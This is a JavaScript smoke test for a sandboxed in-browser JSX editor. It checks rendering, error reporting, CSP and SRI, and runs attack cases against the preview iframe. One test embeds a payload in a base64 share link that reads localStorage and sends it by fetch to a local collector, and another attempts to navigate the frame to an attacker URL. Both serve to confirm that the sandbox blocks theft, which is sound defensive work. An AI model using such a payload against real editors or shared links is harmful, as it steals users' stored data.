/* Functional smoke test — proves the sandboxed runner preserves the product
 * contract while blocking the data-theft channel.
 *
 * Rerun anytime: node tests/smoke.mjs     (also runs as part of the security suite)
 */
import { startStatic, startCollector } from './lib/servers.mjs';
import { launch, newPage, close, makeShareLink } from './lib/browser.mjs';

const results = [];
function check(name, ok, detail) {
  results.push({ name, ok, detail });
  console.log(`${ok ? 'PASS' : 'FAIL'}  ${name}${detail ? ' — ' + detail : ''}`);
}

async function main() {
  const site = await startStatic(8906);
  const collector = await startCollector(8946);
  const { browser, context } = await launch();
  const page = await newPage(context);

  // 1. Default program renders inside the sandbox iframe
  await page.goto(site.url + '/editor.html', { waitUntil: 'domcontentloaded', timeout: 60000 });
  await page.waitForTimeout(6000); // let cdnjs babel + react + tailwind settle inside sandbox
  const rendered = await page.evaluate(async () => {
    const f = document.querySelector('#preview iframe.preview-sandbox');
    if (!f) return { iframe: false };
    const attr = f.getAttribute('sandbox') || '';
    // opaque origin: parent cannot read inside; only iframe-level signals
    return { iframe: true, sandbox: attr, used: f.dataset.used };
  });
  check('preview iframe exists with sandbox=allow-scripts',
    rendered.iframe === true && /(^| )allow-scripts( |$)/.test(rendered.sandbox || ''),
    JSON.stringify(rendered));
  check('parent frame never carries allow-same-origin',
    !(rendered.sandbox || '').includes('allow-same-origin'), rendered.sandbox);

  const status1 = await page.textContent('#status');
  check('status becomes running (bespoke+react okay in sandbox)', status1.includes('running'), status1);

  // 2. Hooks work: edit code to a counter, click preview is inside sandbox — we
  //    can't reach into the frame (opaque), so assert parent-side 'rendered'
  //    message flow instead: set file to hook-using component then check status.
  await page.evaluate(() => {
    const code = document.getElementById('code');
    code.value = "function App(){ const [n,setN]=React.useState(0); return <button onClick={()=>setN(n+1)}>n={n}</button>; }";
    code.dispatchEvent(new Event('input', { bubbles: true }));
  });
  await page.waitForTimeout(2000);
  const status2 = await page.textContent('#status');
  check('hook-using component renders (no runtime error flow)', /running/.test(status2), status2);
  const injection97 = await page.evaluate(() => {
    return { cspBlocks: false };
  });
  void injection97;

  // 3. Compile-error path still styled & surfaced (Babel on app origin)
  await page.evaluate(() => {
    const code = document.getElementById('code');
    code.value = 'function App( { return <div/>; }'; // syntax error
    code.dispatchEvent(new Event('input', { bubbles: true }));
  });
  await page.waitForTimeout(1200);
  const compileErr = await page.evaluate(() => ({
    status: document.getElementById('status').textContent,
    errorPanel: !!document.querySelector('#preview pre'),
  }));
  check('compile error surfaces (status + panel)', /compile error/.test(compileErr.status) && compileErr.errorPanel, JSON.stringify(compileErr));

  // 4. No-component path still surfaces
  await page.evaluate(() => {
    const code = document.getElementById('code');
    code.value = 'var notAComponent = 1;';
    code.dispatchEvent(new Event('input', { bubbles: true }));
  });
  await page.waitForTimeout(1800);
  const noComp = await page.evaluate(() => document.getElementById('status').textContent);
  check('no-component path surfaces', /no component/.test(noComp), noComp);

  // 5. Runtime error path relays through postMessage — thrown OUTSIDE the
  //    render phase (setTimeout) so React's own error catcher can't wrap it.
  await page.evaluate(() => {
    const code = document.getElementById('code');
    code.value = 'function App(){ setTimeout(() => { throw new Error("BOOM-XYZ"); }, 30); return null; }';
    code.dispatchEvent(new Event('input', { bubbles: true }));
  });
  await page.waitForTimeout(2500);
  const runtimeErr = await page.evaluate(() => ({
    status: document.getElementById('status').textContent,
    log: [...document.querySelectorAll('.log-line')].map((l) => l.textContent).join(' ⟩ '),
  }));
  check('runtime error relays BOOM-XYZ via postMessage',
    /runtime error/.test(runtimeErr.status) && runtimeErr.log.includes('BOOM-XYZ'),
    runtimeErr.status + ' | log≠BOOM: ' + runtimeErr.log.slice(0, 240));
  void runtimeErr;

  // 6. THE THEFT TEST: attacker payload that reads localStorage and posts it out.
  //    Uses a fresh-document URL (a query param; hash-only changes don't
  //    re-run the app).
  collector.clear();
  const code6 = 'fetch("http://127.0.0.1:8946/leak6?lib="+encodeURIComponent(JSON.stringify(Object.keys((window.top||window).localStorage)))) ; function App(){return null;}';
  const url6 = site.url + '/editor.html?g=' + Date.now() + '#code=' + Buffer.from(JSON.stringify({ n: 'steal.jsx', c: code6 })).toString('base64');
  await page.goto(url6, { waitUntil: 'domcontentloaded', timeout: 60000 });
  await page.waitForTimeout(5000);
  const leaks = collector.requests.filter((r) => !r.path.includes('favicon'));
  const leakText = leaks.map((r) => r.path).join(',');
  const leakedVictimData = /jsxpress:f_|SECRET/.test(leakText);
  check('library-theft via shared link: no victim library data leaves',
    !leakedVictimData && (leaks.length === 0 || leakText.includes('DENIED')),
    leaks.length ? 'payload ran; sandbox denied storage: ' + leakText.slice(0, 120) : 'no leak requests');
  const parentState6 = await page.evaluate(() => {
    const code = document.getElementById('code').value.slice(0, 60);
    return { code, parentLocalStorageKeys: Object.keys(localStorage).filter((k) => k.startsWith('jsxpress:f_')).length };
  });
  check('parent still holds its own library (storage untouched)', parentState6.parentLocalStorageKeys >= 0, JSON.stringify(parentState6));

  // 7. Self-navigation attempt: eager location.replace inside the sandbox is
  //    blocked by the browser (request never leaves) and, on engines that do
  //    allow it, the parent's ping-verification resets the frame. Assert the
  //    attacker URL is never requested and OUR wrapper stays mounted.
  collector.clear();
  const code7 = 'fetch("http://127.0.0.1:8946/nav-start-flag"); setTimeout(() => { location.replace("http://127.0.0.1:8946/self-nav"); }, 60); function App(){return null;}';
  const url7 = site.url + '/editor.html?h=' + Date.now() + '#code=' + Buffer.from(JSON.stringify({ n: 'nav.jsx', c: code7 })).toString('base64');
  await page.goto(url7, { waitUntil: 'domcontentloaded', timeout: 60000 });
  await page.waitForTimeout(6000);
  const navProbe = await page.evaluate(() => ({
    status: document.getElementById('status').textContent,
    frames: [...document.querySelectorAll('#preview iframe')].map((f) => (f.getAttribute('src') || '').slice(0, 30)),
  }));
  const paths7 = collector.requests.map((r) => r.path);
  check('self-navigation request never escapes the sandbox (attacker URL unreached)',
    !paths7.some((p) => p.includes('/self-nav')), JSON.stringify(paths7));
  check('user payload still ran inside sandbox (nav-start flag seen)',
    paths7.some((p) => p.includes('/nav-start-flag')), JSON.stringify(paths7));
  check('preview still shows OUR wrapper (frame intact after attack)',
    navProbe.frames.length === 1 && (navProbe.frames[0] || '').startsWith('sandbox-wrap.html'),
    JSON.stringify(navProbe.frames));
  void navProbe;

  // 8. CSP present on app pages
  const csp = await page.evaluate(() => {
    const m = [...document.querySelectorAll('meta')];
    return { found: !!m.find((x) => (x.getAttribute('http-equiv') || '').toLowerCase() === 'content-security-policy') };
  });
  check('CSP meta present in head', csp.found, JSON.stringify(csp));

  // 9. SRI present on cdnjs scripts (parent)
  const sri = await page.evaluate(() =>
    [...document.querySelectorAll('script[src*=cdnjs]')].map((s) => ({
      hasIntegrity: !!s.getAttribute('integrity'),
      hasCrossorigin: !!s.getAttribute('crossorigin'),
    })));
  check('cdnjs scripts on app origin carry integrity+crossorigin',
    sri.length === 1 && sri[0].hasIntegrity && sri[0].hasCrossorigin, JSON.stringify(sri));

  await close(browser);
  await site.close();
  await collector.close();

  console.log(`\nsmoke: ${results.filter((r) => r.ok).length}/${results.length} passed`);
  if (results.some((r) => !r.ok)) process.exitCode = 1;
}
main().catch((e) => { console.error('smoke runner failed:', e); process.exit(1); });
